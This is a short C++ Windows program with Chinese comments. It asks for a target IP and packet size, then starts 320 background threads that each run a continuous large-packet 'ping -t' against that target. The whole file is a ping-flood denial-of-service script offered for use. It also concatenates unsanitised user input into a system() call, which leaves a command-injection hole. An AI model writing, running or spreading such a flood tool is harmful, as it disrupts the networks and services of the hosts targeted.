#include "stdafx.h"
#include <iostream>
#include <string>
#include <thread>
#include <windows.h>

using namespace std;

string IP, data_size, ICMP = "ping -l ";

void Ping() {
	system(ICMP.c_str());  //最高可以65500位元組
}

int main() {
	cout << "輸入目標IP : ";
	cin >> IP;
	cout << "輸入封包大小 : ";
	cin >> data_size;
	ICMP += data_size + " -t " + IP;
	for (int pl = 0; pl<320; pl++) {   //一次開啟320線程 
		thread th1(Ping);              //創建線程
		th1.detach();                  //啟動線程；該線程在後台允許，無需等待該線程完成，繼續執行後面的語句
		Sleep(30);                     //降低瞬間值(每0.03秒增加1線程) 
	}
	while (1) {};                      //維持主程式的運行
	return 0;
}
